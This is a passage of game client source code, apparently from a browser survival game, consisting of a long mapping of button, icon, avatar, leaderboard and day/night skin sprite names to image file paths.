                    CHANGELOG_BUTTON_OUT: "img/changelog_29.png",
                    DEVASTIO_BUTTON_OUT: "img/banner-devast.png",
                    PROFILE_BUTTON_OUT: "img/profile-button-out.png",
                    PROFILE_BUTTON_IN: "img/profile-button-in.png",
                    PROFILE_BUTTON_CLICK: "img/profile-button-click.png",
                    LOGIN_BUTTON_OUT: "img/login-button-out.png",
                    LOGIN_BUTTON_IN: "img/login-button-in.png",
                    LOGIN_BUTTON_CLICK: "img/login-button-click.png",
                    LOGIN_GOOGLE_OUT: "img/login-google-out.png",
                    LOGIN_GOOGLE_IN: "img/login-google-in.png",
                    LOGIN_GOOGLE_CLICK: "img/login-google-click.png",
                    LOGIN_FACEBOOK_OUT: "img/login-facebook-out.png",
                    LOGIN_FACEBOOK_IN: "img/login-facebook-in.png",
                    LOGIN_FACEBOOK_CLICK: "img/login-facebook-click.png",
                    ACCOUNT_BOX: "img/account-box.png",
                    ACCOUNT_MAINTENANCE: "img/account-under-maintenance.png",
                    CLOSE_BUTTON_OUT: "img/close-button-account-out.png",
                    CLOSE_BUTTON_IN: "img/close-button-account-in.png",
                    CLOSE_BUTTON_CLICK: "img/close-button-account-click.png",
                    PLAY_BUTTON_OUT: "img/play-button-out.png",
                    PLAY_BUTTON_IN: "img/play-button-in.png",
                    PLAY_BUTTON_CLICK: "img/play-button-click.png",
                    MODIFY_NAME_OUT: "img/modify-name-out.png",
                    MODIFY_NAME_IN: "img/modify-name-in.png",
                    MODIFY_NAME_CLICK: "img/modify-name-click.png",
                    YES_BUTTON_OUT: "img/yes-button-out.png",
                    YES_BUTTON_IN: "img/yes-button-in.png",
                    YES_BUTTON_CLICK: "img/yes-button-click.png",
                    YES_300_BUTTON_OUT: "img/yes-300-button-out.png",
                    YES_300_BUTTON_IN: "img/yes-300-button-in.png",
                    YES_300_BUTTON_CLICK: "img/yes-300-button-click.png",
                    NO_BUTTON_OUT: "img/no-button-out.png",
                    NO_BUTTON_IN: "img/no-button-in.png",
                    NO_BUTTON_CLICK: "img/no-button-click.png",
                    NO_THANKS_BUTTON_OUT: "img/no-thanks-button-out.png",
                    NO_THANKS_BUTTON_IN: "img/no-thanks-button-in.png",
                    NO_THANKS_BUTTON_CLICK: "img/no-thanks-button-click.png",
                    SHOP_BUTTON_OUT: "img/shop-button-out.png",
                    SHOP_BUTTON_IN: "img/shop-button-in.png",
                    SHOP_BUTTON_CLICK: "img/shop-button-click.png",
                    LOGOUT_OUT: "img/logout-out.png",
                    LOGOUT_IN: "img/logout-in.png",
                    LOGOUT_CLICK: "img/logout-click.png",
                    TERMS_BUTTON_OUT: "img/terms-button-out.png",
                    TERMS_BUTTON_IN: "img/terms-button-in.png",
                    TERMS_BUTTON_CLICK: "img/terms-button-click.png",
                    TUTORIAL_ICON: "img/tutorial-icon.png",
                    SKINS_ICON: "img/skins-icon.png",
                    SHOP_ICON: "img/shop-icon.png",
                    PAINT_ICON: "img/paint-icon.png",
                    LEADERBOARD_ICON: "img/leaderboard-icon.png",
                    START_ICON: "img/start-icon.png",
                    PROFILE_ICON: "img/profile-icon.png",
                    SERVER_ACCESS_ICON: "img/server-access-icon2.png",
                    ICONS_BG_BUTTON_OUT: "img/button-homepage-bg-out.png",
                    ICONS_BG_BUTTON_IN: "img/button-homepage-bg-in.png",
                    ICONS_BG_BUTTON_CLICK: "img/button-homepage-bg-click.png",
                    ICONS_BOTTOM_BG_BUTTON_OUT: "img/button-bottom-homepage-bg-out.png",
                    ICONS_BOTTOM_BG_BUTTON_IN: "img/button-bottom-homepage-bg-in.png",
                    ICONS_BOTTOM_BG_BUTTON_CLICK: "img/button-bottom-homepage-bg-click.png",
                    AVATAR_RESUME: "img/lvl-player.png",
                    AVATAR_LVL1: "img/avatar-player.png",
                    AVATAR_LVL2: "img/avatar-player1.png",
                    AVATAR_LVL3: "img/avatar-player2.png",
                    AVATAR_LVL4: "img/avatar-player3.png",
                    AVATAR_LVL5: "img/avatar-player4.png",
                    AVATAR_LVL6: "img/avatar-player5.png",
                    AVATAR_LVL7: "img/avatar-player6.png",
                    AVATAR_LVL8: "img/avatar-player7.png",
                    AVATAR_LVL9: "img/avatar-player8.png",
                    AVATAR_LVL10: "img/avatar-player9.png",
                    AVATAR_LVL11: "img/avatar-player10.png",
                    AVATAR_LVL12: "img/avatar-player11.png",
                    AVATAR_LVL13: "img/avatar-player12.png",
                    AVATAR_LVL14: "img/avatar-player13.png",
                    AVATAR_LVL15: "img/avatar-player14.png",
                    AVATAR_LVL16: "img/avatar-player14.png",
                    AVATAR_LVL17: "img/avatar-player14.png",
                    AVATAR_LVL18: "img/avatar-player14.png",
                    GOLDEN_BREAD: "img/golden-bread.png",
                    BUY_BREAD_OUT: "img/buy-bread-out.png",
                    BUY_BREAD_IN: "img/buy-bread-in.png",
                    BUY_BREAD_CLICK: "img/buy-bread-click.png",
                    GAUGE: "img/gauge.png",
                    SEASON_4: "img/season-4-out.png",
                    SEASON_4_IN: "img/season-4-in.png",
                    SEASON_4_OUT: "img/season-4-click.png",
                    SEASON4_BOX: "img/season4-box.png",
                    SEASON_5: "img/season-5-out.png",
                    SEASON_5_IN: "img/season-5-in.png",
                    SEASON_5_OUT: "img/season-5-click.png",
                    SEASON5_BOX: "img/season5-box.png",
                    PROFILE_BOX: "img/profile2-box.png",
                    SKINS_BOX: "img/skins-box.png",
                    SHOP_BOX: "img/shop-box.png",
                    PRIVATE_SERVER_BOX: "img/private-server-box.png",
                    SERVER_LOCATION_BOX: "img/location-box.png",
                    SERVER_DURATION_BOX: "img/server-duration-box.png",
                    TUTORIAL_BOX: "img/tutorial-box.png",
                    LEADERBOARD_BOX: "img/leaderboard1-box.png",
                    BUY_BREAD_BOX: "img/buy-breads-box.png",
                    BAG_BOX: "img/bag-box.png",
                    CRATE_BOX: "img/deadbox-box.png",
                    BOOK_BOX: "img/book-box.png",
                    ACCESSORIES_BOX: "img/accessories-box.png",
                    CUSTOM_SKIN_BOX: "img/customskin-box.png",
                    BAG_REMAIN_BOX: "img/bag-lasts.png",
                    SERVER_REMAIN_BOX: "img/server-lasts.png",
                    SERVER_ACCESS_BOX: "img/server-access-box2.png",
                    LOOT_BOX: "img/lootbox-box.png",
                    CHANGE_NICKNAME1_BOX: "img/change-nickname0.png",
                    CHANGE_NICKNAME0_BOX: "img/change-nickname1.png",
                    CHEATING_BOX: "img/cheating-box.png",
                    DAILY_QUEST_BOX: "img/daily-quest-box.png",
                    DAILY_5_BREAD: "img/daily-5-bread.png",
                    DAILY_10_BREAD: "img/daily-10-bread.png",
                    DAILY_VALID: "img/daily-valid.png",
                    NORMAL_PROFILE_OUT: "img/normal-profile-out.png",
                    NORMAL_PROFILE_IN: "img/normal-profile-in.png",
                    NORMAL_PROFILE_CLICK: "img/normal-profile-click.png",
                    FOREST_PROFILE_OUT: "img/forest-profile-out.png",
                    FOREST_PROFILE_IN: "img/forest-profile-in.png",
                    FOREST_PROFILE_CLICK: "img/forest-profile-click.png",
                    ZOMBIE_PROFILE_OUT: "img/zombie-profile-out.png",
                    ZOMBIE_PROFILE_IN: "img/zombie-profile-in.png",
                    ZOMBIE_PROFILE_CLICK: "img/zombie-profile-click.png",
                    VAMPIRE_PROFILE_OUT: "img/vampire-profile-out.png",
                    VAMPIRE_PROFILE_IN: "img/vampire-profile-in.png",
                    VAMPIRE_PROFILE_CLICK: "img/vampire-profile-click.png",
                    TOTAL_PROFILE_OUT: "img/total-profile-out.png",
                    TOTAL_PROFILE_IN: "img/total-profile-in.png",
                    TOTAL_PROFILE_CLICK: "img/total-profile-click.png",
                    SEASON1_PROFILE_OUT: "img/season1-profile-out.png",
                    SEASON1_PROFILE_IN: "img/season1-profile-in.png",
                    SEASON1_PROFILE_CLICK: "img/season1-profile-click.png",
                    SEASON2_PROFILE_OUT: "img/season2-profile-out.png",
                    SEASON2_PROFILE_IN: "img/season2-profile-in.png",
                    SEASON2_PROFILE_CLICK: "img/season2-profile-click.png",
                    SEASON3_PROFILE_OUT: "img/season3-profile-out.png",
                    SEASON3_PROFILE_IN: "img/season3-profile-in.png",
                    SEASON3_PROFILE_CLICK: "img/season3-profile-click.png",
                    SEASON4_PROFILE_OUT: "img/season4-profile-out.png",
                    SEASON4_PROFILE_IN: "img/season4-profile-in.png",
                    SEASON4_PROFILE_CLICK: "img/season4-profile-click.png",
                    SEASON5_PROFILE_OUT: "img/season5-profile-out.png",
                    SEASON5_PROFILE_IN: "img/season5-profile-in.png",
                    SEASON5_PROFILE_CLICK: "img/season5-profile-click.png",
                    LOCKED_SKIN_ALERT: "img/locked-skin-alert.png",
                    LOCKED_CUSTOM_ALERT: "img/locked-custom-alert.png",
                    RED_LOCKED: "img/bg-red-locked.png",
                    SKIN_BUTTON_OUT: "img/skin-button-out.png",
                    SKIN_BUTTON_IN: "img/skin-button-in.png",
                    SKIN_BUTTON_CLICK: "img/skin-button-click.png",
                    ACCESSORY_BUTTON_OUT: "img/accessory-button-out.png",
                    ACCESSORY_BUTTON_IN: "img/accessory-button-in.png",
                    ACCESSORY_BUTTON_CLICK: "img/accessory-button-click.png",
                    BAG_BUTTON_OUT: "img/bag-button-out.png",
                    BAG_BUTTON_IN: "img/bag-button-in.png",
                    BAG_BUTTON_CLICK: "img/bag-button-click.png",
                    BOOK_BUTTON_OUT: "img/book-button-out.png",
                    BOOK_BUTTON_IN: "img/book-button-in.png",
                    BOOK_BUTTON_CLICK: "img/book-button-click.png",
                    CRATE_BUTTON_OUT: "img/deadbox-button-out.png",
                    CRATE_BUTTON_IN: "img/deadbox-button-in.png",
                    CRATE_BUTTON_CLICK: "img/deadbox-button-click.png",
                    LOOT_BUTTON_OUT: "img/loot-button-out.png",
                    LOOT_BUTTON_IN: "img/loot-button-in.png",
                    LOOT_BUTTON_CLICK: "img/loot-button-click.png",
                    FREE_ITEM_OUT: "img/free-item-out.png",
                    FREE_ITEM_IN: "img/free-item-in.png",
                    FREE_ITEM_CLICK: "img/free-item-click.png",
                    WOOD_ITEM_OUT: "img/wood-item-out.png",
                    WOOD_ITEM_IN: "img/wood-item-in.png",
                    WOOD_ITEM_CLICK: "img/wood-item-click.png",
                    STONE_ITEM_OUT: "img/stone-item.png",
                    STONE_ITEM_IN: "img/stone-item-in.png",
                    STONE_ITEM_CLICK: "img/stone-item-click.png",
                    GOLD_ITEM_OUT: "img/gold-item.png",
                    GOLD_ITEM_IN: "img/gold-item-in.png",
                    GOLD_ITEM_CLICK: "img/gold-item-click.png",
                    DIAMOND_ITEM_OUT: "img/diamond-item.png",
                    DIAMOND_ITEM_IN: "img/diamond-item-in.png",
                    DIAMOND_ITEM_CLICK: "img/diamond-item-click.png",
                    AMETHYST_ITEM_OUT: "img/amethyst-item.png",
                    AMETHYST_ITEM_IN: "img/amethyst-item-in.png",
                    AMETHYST_ITEM_CLICK: "img/amethyst-item-click.png",
                    REIDITE_ITEM_OUT: "img/reidite-item.png",
                    REIDITE_ITEM_IN: "img/reidite-item-in.png",
                    REIDITE_ITEM_CLICK: "img/reidite-item-click.png",
                    SPECIAL_ITEM_OUT: "img/special-item-out.png",
                    SPECIAL_ITEM_IN: "img/special-item-in.png",
                    SPECIAL_ITEM_CLICK: "img/special-item-click.png",
                    LEVEL_ITEM_OUT: "img/level-item-out.png",
                    LEVEL_ITEM_IN: "img/level-item-in.png",
                    LEVEL_ITEM_CLICK: "img/level-item-click.png",
                    SKIN_PREVIOUS_OUT: "img/skin-previous-out.png",
                    SKIN_PREVIOUS_IN: "img/skin-previous-in.png",
                    SKIN_PREVIOUS_CLICK: "img/skin-previous-click.png",
                    SKIN_NEXT_OUT: "img/skin-next-out.png",
                    SKIN_NEXT_IN: "img/skin-next-in.png",
                    SKIN_NEXT_CLICK: "img/skin-next-click.png",
                    BACK_BUTTON_OUT: "img/back-button-out.png",
                    BACK_BUTTON_IN: "img/back-button-in.png",
                    BACK_BUTTON_CLICK: "img/back-button-click.png",
                    GET_MORE_BUTTON_OUT: "img/get-more-button-out.png",
                    GET_MORE_BUTTON_IN: "img/get-more-button-in.png",
                    GET_MORE_BUTTON_CLICK: "img/get-more-button-click.png",
                    CURRENCY1_OUT: "img/currency1-out.png",
                    CURRENCY1_IN: "img/currency1-in.png",
                    CURRENCY1_CLICK: "img/currency1-click.png",
                    CURRENCY2_OUT: "img/currency2-out.png",
                    CURRENCY2_IN: "img/currency2-in.png",
                    CURRENCY2_CLICK: "img/currency2-click.png",
                    CURRENCY3_OUT: "img/currency3-out.png",
                    CURRENCY3_IN: "img/currency3-in.png",
                    CURRENCY3_CLICK: "img/currency3-click.png",
                    CURRENCY4_OUT: "img/currency4-out.png",
                    CURRENCY4_IN: "img/currency4-in.png",
                    CURRENCY4_CLICK: "img/currency4-click.png",
                    CURRENCY5_OUT: "img/currency5-out.png",
                    CURRENCY5_IN: "img/currency5-in.png",
                    CURRENCY5_CLICK: "img/currency5-click.png",
                    PRICE1_OUT: "img/price1-out.png",
                    PRICE1_IN: "img/price1-in.png",
                    PRICE1_CLICK: "img/price1-click.png",
                    PRICE2_OUT: "img/price2-out.png",
                    PRICE2_IN: "img/price2-in.png",
                    PRICE2_CLICK: "img/price2-click.png",
                    PRICE3_OUT: "img/price3-out.png",
                    PRICE3_IN: "img/price3-in.png",
                    PRICE3_CLICK: "img/price3-click.png",
                    PRICE4_OUT: "img/price4-out.png",
                    PRICE4_IN: "img/price4-in.png",
                    PRICE4_CLICK: "img/price4-click.png",
                    PRICE5_OUT: "img/price5-out.png",
                    PRICE5_IN: "img/price5-in.png",
                    PRICE5_CLICK: "img/price5-click.png",
                    BUY_PRIVATE_SERVER_OUT: "img/buy-private-server-out.png",
                    BUY_PRIVATE_SERVER_IN: "img/buy-private-server-in.png",
                    BUY_PRIVATE_SERVER_CLICK: "img/buy-private-server-click.png",
                    ATLANTA_OUT: "img/atlanta-out.png",
                    ATLANTA_IN: "img/atlanta-in.png",
                    ATLANTA_CLICK: "img/atlanta-click.png",
                    DALLAS_OUT: "img/dallas-out.png",
                    DALLAS_IN: "img/dallas-in.png",
                    DALLAS_CLICK: "img/dallas-click.png",
                    FREMONT_OUT: "img/fremont-out.png",
                    FREMONT_IN: "img/fremont-in.png",
                    FREMONT_CLICK: "img/fremont-click.png",
                    NEWARK_OUT: "img/newark-out.png",
                    NEWARK_IN: "img/newark-in.png",
                    NEWARK_CLICK: "img/newark-click.png",
                    TORONTO_OUT: "img/toronto-out.png",
                    TORONTO_IN: "img/toronto-in.png",
                    TORONTO_CLICK: "img/toronto-click.png",
                    SINGAPORE_OUT: "img/singapore-out.png",
                    SINGAPORE_IN: "img/singapore-in.png",
                    SINGAPORE_CLICK: "img/singapore-click.png",
                    FRANKFURT_OUT: "img/frankfurt-out.png",
                    FRANKFURT_IN: "img/frankfurt-in.png",
                    FRANKFURT_CLICK: "img/frankfurt-click.png",
                    LONDON_OUT: "img/london-out.png",
                    LONDON_IN: "img/london-in.png",
                    LONDON_CLICK: "img/london-click.png",
                    MUMBAI_OUT: "img/mumbai-out.png",
                    MUMBAI_IN: "img/mumbai-in.png",
                    MUMBAI_CLICK: "img/mumbai-click.png",
                    TOKYO_OUT: "img/tokyo-out.png",
                    TOKYO_IN: "img/tokyo-in.png",
                    TOKYO_CLICK: "img/tokyo-click.png",
                    YES_LOCATION_OUT: "img/yes-location-out.png",
                    YES_LOCATION_IN: "img/yes-location-in.png",
                    YES_LOCATION_CLICK: "img/yes-location-click.png",
                    DAYS3_OUT: "img/3days-out.png",
                    DAYS3_IN: "img/3days-in.png",
                    DAYS3_CLICK: "img/3days-click.png",
                    DAYS7_OUT: "img/7days-out.png",
                    DAYS7_IN: "img/7days-in.png",
                    DAYS7_CLICK: "img/7days-click.png",
                    DAYS30_OUT: "img/30days-out.png",
                    DAYS30_IN: "img/30days-in.png",
                    DAYS30_CLICK: "img/30days-click.png",
                    DAYS90_OUT: "img/90days-out.png",
                    DAYS90_IN: "img/90days-in.png",
                    DAYS90_CLICK: "img/90days-click.png",
                    SPIN1: "img/spin1.png",
                    SPIN2: "img/spin2.png",
                    SPIN3: "img/spin3.png",
                    SPIN4: "img/spin4.png",
                    SPIN5: "img/spin5.png",
                    SPIN6: "img/spin6.png",
                    ARROW_SPIN: "img/arrow-spin.png",
                    SPIN_BUTTON_1_OUT: "img/spin-button-1-out.png",
                    SPIN_BUTTON_1_IN: "img/spin-button-1-in.png",
                    SPIN_BUTTON_1_CLICK: "img/spin-button-1-click.png",
                    SPIN_BUTTON_2_OUT: "img/spin-button-2-out.png",
                    SPIN_BUTTON_2_IN: "img/spin-button-2-in.png",
                    SPIN_BUTTON_2_CLICK: "img/spin-button-2-click.png",
                    SPIN_BUTTON_3_OUT: "img/spin-button-3-out.png",
                    SPIN_BUTTON_3_IN: "img/spin-button-3-in.png",
                    SPIN_BUTTON_3_CLICK: "img/spin-button-3-click.png",
                    SPIN_BUTTON_4_OUT: "img/spin-button-4-out.png",
                    SPIN_BUTTON_4_IN: "img/spin-button-4-in.png",
                    SPIN_BUTTON_4_CLICK: "img/spin-button-4-click.png",
                    SPIN_BUTTON_5_OUT: "img/spin-button-5-out.png",
                    SPIN_BUTTON_5_IN: "img/spin-button-5-in.png",
                    SPIN_BUTTON_5_CLICK: "img/spin-button-5-click.png",
                    SPIN_LIGHT: "img/spin-light.png",
                    TUTO_WIKI_OUT: "img/tuto-wiki-out.png",
                    TUTO_WIKI_IN: "img/tuto-wiki-in.png",
                    TUTO_WIKI_CLICK: "img/tuto-wiki-click.png",
                    TUTO_PREVIOUS_OUT: "img/tuto-previous-out.png",
                    TUTO_PREVIOUS_IN: "img/tuto-previous-in.png",
                    TUTO_PREVIOUS_CLICK: "img/tuto-previous-click.png",
                    TUTO_NEXT_OUT: "img/tuto-next-out.png",
                    TUTO_NEXT_IN: "img/tuto-next-in.png",
                    TUTO_NEXT_CLICK: "img/tuto-next-click.png",
                    TIME_LEADERBOARD_OUT: "img/time-leaderboard-out.png",
                    TIME_LEADERBOARD_IN: "img/time-leaderboard-in.png",
                    TIME_LEADERBOARD_CLICK: "img/time-leaderboard-click.png",
                    SCORE_LEADERBOARD_OUT: "img/score-leaderboard-out.png",
                    SCORE_LEADERBOARD_IN: "img/score-leaderboard-in.png",
                    SCORE_LEADERBOARD_CLICK: "img/score-leaderboard-click.png",
                    LVL_LEADERBOARD_OUT: "img/lvl-leaderboard-out.png",
                    LVL_LEADERBOARD_IN: "img/lvl-leaderboard-in.png",
                    LVL_LEADERBOARD_CLICK: "img/lvl-leaderboard-click.png",
                    KILL_LEADERBOARD_OUT: "img/kill-leaderboard-out.png",
                    KILL_LEADERBOARD_IN: "img/kill-leaderboard-in.png",
                    KILL_LEADERBOARD_CLICK: "img/kill-leaderboard-click.png",
                    ALL_LEADERBOARD_OUT: "img/all-leaderboard-out.png",
                    ALL_LEADERBOARD_IN: "img/all-leaderboard-in.png",
                    ALL_LEADERBOARD_CLICK: "img/all-leaderboard-click.png",
                    TODAY_LEADERBOARD_OUT: "img/today-leaderboard-out.png",
                    TODAY_LEADERBOARD_IN: "img/today-leaderboard-in.png",
                    TODAY_LEADERBOARD_CLICK: "img/today-leaderboard-click.png",
                    WEEK_LEADERBOARD_OUT: "img/week-leaderboard-out.png",
                    WEEK_LEADERBOARD_IN: "img/week-leaderboard-in.png",
                    WEEK_LEADERBOARD_CLICK: "img/week-leaderboard-click.png",
                    SEASON1_LEADERBOARD_OUT: "img/season1-out.png",
                    SEASON1_LEADERBOARD_IN: "img/season1-in.png",
                    SEASON1_LEADERBOARD_CLICK: "img/season1-click.png",
                    SEASON2_LEADERBOARD_OUT: "img/season2--out.png",
                    SEASON2_LEADERBOARD_IN: "img/season2--in.png",
                    SEASON2_LEADERBOARD_CLICK: "img/season2--click.png",
                    SEASON3_LEADERBOARD_OUT: "img/season3-out.png",
                    SEASON3_LEADERBOARD_IN: "img/season3-in.png",
                    SEASON3_LEADERBOARD_CLICK: "img/season3-click.png",
                    SEASON4_LEADERBOARD_OUT: "img/season4-out.png",
                    SEASON4_LEADERBOARD_IN: "img/season4-in.png",
                    SEASON4_LEADERBOARD_CLICK: "img/season4-click.png",
                    SEASON5_LEADERBOARD_OUT: "img/season5-out.png",
                    SEASON5_LEADERBOARD_IN: "img/season5-in.png",
                    SEASON5_LEADERBOARD_CLICK: "img/season5-click.png",
                    TOTAL_LEAD_OUT: "img/total-lead-out.png",
                    TOTAL_LEAD_IN: "img/total-lead-in.png",
                    TOTAL_LEAD_CLICK: "img/total-lead-click.png",
                    NORMAL_LEAD_OUT: "img/normal-lead-out.png",
                    NORMAL_LEAD_IN: "img/normal-lead-in.png",
                    NORMAL_LEAD_CLICK: "img/normal-lead-click.png",
                    FOREST_LEAD_OUT: "img/forest-lead-out.png",
                    FOREST_LEAD_IN: "img/forest-lead-in.png",
                    FOREST_LEAD_CLICK: "img/forest-lead-click.png",
                    VAMPIRE_LEAD_OUT: "img/vampire-lead-out.png",
                    VAMPIRE_LEAD_IN: "img/vampire-lead-in.png",
                    VAMPIRE_LEAD_CLICK: "img/vampire-lead-click.png",
                    ZOMBIE_LEAD_OUT: "img/zombie-lead-out.png",
                    ZOMBIE_LEAD_IN: "img/zombie-lead-in.png",
                    ZOMBIE_LEAD_CLICK: "img/zombie-lead-click.png",
                    LEVEL5D: "img/day-level5.png",
                    LEVEL5N: "img/night-level5.png",
                    LEVEL10D: "img/day-level10.png",
                    LEVEL10N: "img/night-level10.png",
                    LEVEL15D: "img/day-level15.png",
                    LEVEL15N: "img/night-level15.png",
                    LEVEL20D: "img/day-level20.png",
                    LEVEL20N: "img/night-level20.png",
                    LEVEL25D: "img/day-level25.png",
                    LEVEL25N: "img/night-level25.png",
                    LEVEL30D: "img/day-level30.png",
                    LEVEL30N: "img/night-level30.png",
                    LEVEL35D: "img/day-level35.png",
                    LEVEL35N: "img/night-level35.png",
                    LEVEL40D: "img/day-level40.png",
                    LEVEL40N: "img/night-level40.png",
                    LEVEL45D: "img/day-level45.png",
                    LEVEL45N: "img/night-level45.png",
                    LEVEL50D: "img/day-level50.png",
                    LEVEL50N: "img/night-level50.png",
                    LEVEL55D: "img/day-level55.png",
                    LEVEL55N: "img/night-level55.png",
                    LEVEL60D: "img/day-level60.png",
                    LEVEL60N: "img/night-level60.png",
                    SKIN_DEVASTD: "img/day-skin-devast0.png",
                    SKIN_DEVASTN: "img/night-skin-devast0.png",
                    HAND_DEVASTD: "img/day-hand-devaster.png",
                    HAND_DEVASTN: "img/night-hand-devaster.png",
                    SKIN_STARD: "img/day-skin-star0.png",
                    SKIN_STARN: "img/night-skin-star0.png",
                    HAND_STARD: "img/day-hand-star0.png",
                    HAND_STARN: "img/night-hand-star0.png",
                    SKIN_VAMPIRED: "img/day-vampire.png",
                    SKIN_VAMPIREN: "img/night-vampire.png",
                    HAND_VAMPIRED: "img/day-hand-vampire.png",
                    HAND_VAMPIREN: "img/night-hand-vampire.png",
                    SKIN_ZOMBIED: "img/day-zombie.png",
                    SKIN_ZOMBIEN: "img/night-zombie.png",
                    HAND_ZOMBIED: "img/day-hand-zombie.png",
                    HAND_ZOMBIEN: "img/night-hand-zombie.png",
                    SKIN_ROBOTD: "img/day-skin113.png",
                    SKIN_ROBOTN: "img/night-skin113.png",
                    HAND_ROBOTD: "img/day-hand-skin113.png",
                    HAND_ROBOTN: "img/night-hand-skin113.png",
                    SKIN0D: "img/day-skin0.png",
                    SKIN0N: "img/night-skin0.png",
                    SKIN1D: "img/day-skin1.png",
                    SKIN1N: "img/night-skin1.png",
                    SKIN2D: "img/day-skin2.png",
                    SKIN2N: "img/night-skin2.png",
                    SKIN3D: "img/day-skin3.png",
                    SKIN3N: "img/night-skin3.png",
                    SKIN4D: "img/day-skin4.png",
                    SKIN4N: "img/night-skin4.png",
                    SKIN5D: "img/day-skin5.png",
                    SKIN5N: "img/night-skin5.png",
                    SKIN6D: "img/day-skin6.png",
                    SKIN6N: "img/night-skin6.png",
                    SKIN7D: "img/day-skin7.png",
                    SKIN7N: "img/night-skin7.png",
                    SKIN8D: "img/day-skin8.png",
                    SKIN8N: "img/night-skin8.png",
                    SKIN9D: "img/day-skin9.png",
                    SKIN9N: "img/night-skin9.png",
                    SKIN10D: "img/day-skin10.png",
                    SKIN10N: "img/night-skin10.png",
                    SKIN11D: "img/day-skin11.png",
                    SKIN11N: "img/night-skin11.png",
                    SKIN12D: "img/day-skin12.png",
                    SKIN12N: "img/night-skin12.png",
                    SKIN13D: "img/day-skin13.png",
                    SKIN13N: "img/night-skin13.png",
                    SKIN14D: "img/day-skin14.png",
                    SKIN14N: "img/night-skin14.png",
                    SKIN15D: "img/day-skin15.png",
                    SKIN15N: "img/night-skin15.png",
                    SKIN16D: "img/day-skin16.png",
                    SKIN16N: "img/night-skin16.png",
                    SKIN17D: "img/day-skin17.png",
                    SKIN17N: "img/night-skin17.png",
                    SKIN18D: "img/day-skin18.png",
                    SKIN18N: "img/night-skin18.png",
                    SKIN19D: "img/day-skin19.png",
                    SKIN19N: "img/night-skin19.png",
                    SKIN20D: "img/day-skin20.png",
                    SKIN20N: "img/night-skin20.png",
                    SKIN21D: "img/day-skin21.png",
                    SKIN21N: "img/night-skin21.png",
                    SKIN22D: "img/day-skin22.png",
                    SKIN22N: "img/night-skin22.png",
                    SKIN23D: "img/day-skin23.png",
                    SKIN23N: "img/night-skin23.png",
                    SKIN24D: "img/day-skin24.png",
                    SKIN24N: "img/night-skin24.png",
                    SKIN25D: "img/day-skin25.png",
                    SKIN25N: "img/night-skin25.png",
                    SKIN26D: "img/day-skin26.png",
                    SKIN26N: "img/night-skin26.png",
                    SKIN27D: "img/day-skin27.png",
                    SKIN27N: "img/night-skin27.png",
                    SKIN28D: "img/day-skin28.png",
                    SKIN28N: "img/night-skin28.png",
                    SKIN29D: "img/day-skin29.png",
                    SKIN29N: "img/night-skin29.png",
                    SKIN30D: "img/day-skin30.png",
                    SKIN30N: "img/night-skin30.png",
                    SKIN31D: "img/day-skin31.png",
                    SKIN31N: "img/night-skin31.png",
                    SKIN32D: "img/day-skin32.png",
                    SKIN32N: "img/night-skin32.png",
                    SKIN33D: "img/day-skin33.png",
                    SKIN33N: "img/night-skin33.png",
                    SKIN34D: "img/day-skin34.png",
                    SKIN34N: "img/night-skin34.png",
                    SKIN35D: "img/day-skin35.png",
                    SKIN35N: "img/night-skin35.png",
                    SKIN36D: "img/day-skin36.png",
                    SKIN36N: "img/night-skin36.png",
                    SKIN37D: "img/day-skin37.png",
                    SKIN37N: "img/night-skin37.png",
                    SKIN38D: "img/day-skin38.png",
                    SKIN38N: "img/night-skin38.png",
                    SKIN39D: "img/day-skin39.png",
                    SKIN39N: "img/night-skin39.png",
                    SKIN40D: "img/day-skin40.png",
                    SKIN40N: "img/night-skin40.png",
                    SKIN41D: "img/day-skin41.png",
                    SKIN41N: "img/night-skin41.png",
                    SKIN42D: "img/day-skin42.png",
                    SKIN42N: "img/night-skin42.png",
                    SKIN43D: "img/day-skin43.png",
                    SKIN43N: "img/night-skin43.png",
                    SKIN44D: "img/day-skin44.png",
                    SKIN44N: "img/night-skin44.png",
                    SKIN45D: "img/day-skin45.png",
                    SKIN45N: "img/night-skin45.png",
                    SKIN46D: "img/day-skin46.png",
                    SKIN46N: "img/night-skin46.png",
                    SKIN47D: "img/day-skin47.png",
                    SKIN47N: "img/night-skin47.png",
                    SKIN48D: "img/day-skin48.png",
                    SKIN48N: "img/night-skin48.png",
                    SKIN49D: "img/day-skin49.png",
                    SKIN49N: "img/night-skin49.png",
                    SKIN50D: "img/day-skin50.png",
                    SKIN50N: "img/night-skin50.png",
                    SKIN51D: "img/day-skin51.png",
                    SKIN51N: "img/night-skin51.png",
                    SKIN52D: "img/day-skin52.png",
                    SKIN52N: "img/night-skin52.png",
                    SKIN53D: "img/day-skin53.png",
                    SKIN53N: "img/night-skin53.png",
                    SKIN54D: "img/day-skin54.png",
                    SKIN54N: "img/night-skin54.png",
                    SKIN55D: "img/day-skin55.png",
                    SKIN55N: "img/night-skin55.png",
                    SKIN56D: "img/day-skin56.png",
                    SKIN56N: "img/night-skin56.png",
                    SKIN57D: "img/day-skin57.png",
                    SKIN57N: "img/night-skin57.png",
                    SKIN58D: "img/day-skin58.png",
                    SKIN58N: "img/night-skin58.png",
                    SKIN59D: "img/day-skin59.png",
                    SKIN59N: "img/night-skin59.png",
                    SKIN60D: "img/day-skin60.png",
                    SKIN60N: "img/night-skin60.png",
                    SKIN61D: "img/day-skin61.png",
                    SKIN61N: "img/night-skin61.png",
                    SKIN62D: "img/day-skin62.png",
                    SKIN62N: "img/night-skin62.png",
                    SKIN63D: "img/day-skin63.png",
                    SKIN63N: "img/night-skin63.png",
                    SKIN64D: "img/day-skin64.png",
                    SKIN64N: "img/night-skin64.png",
                    SKIN65D: "img/day-skin65.png",
                    SKIN65N: "img/night-skin65.png",
                    SKIN66D: "img/day-skin66.png",
                    SKIN66N: "img/night-skin66.png",
                    SKIN67D: "img/day-skin67.png",
                    SKIN67N: "img/night-skin67.png",
                    SKIN68D: "img/day-skin68.png",
                    SKIN68N: "img/night-skin68.png",
                    SKIN69D: "img/day-skin69.png",
                    SKIN69N: "img/night-skin69.png",
                    SKIN70D: "img/day-skin70.png",
                    SKIN70N: "img/night-skin70.png",
                    SKIN71D: "img/day-skin71.png",
                    SKIN71N: "img/night-skin71.png",
                    SKIN72D: "img/day-skin72.png",
                    SKIN72N: "img/night-skin72.png",
                    SKIN73D: "img/day-skin73.png",
                    SKIN73N: "img/night-skin73.png",
                    SKIN74D: "img/day-skin74.png",
                    SKIN74N: "img/night-skin74.png",
                    SKIN75D: "img/day-skin75.png",
                    SKIN75N: "img/night-skin75.png",
                    SKIN76D: "img/day-skin76.png",
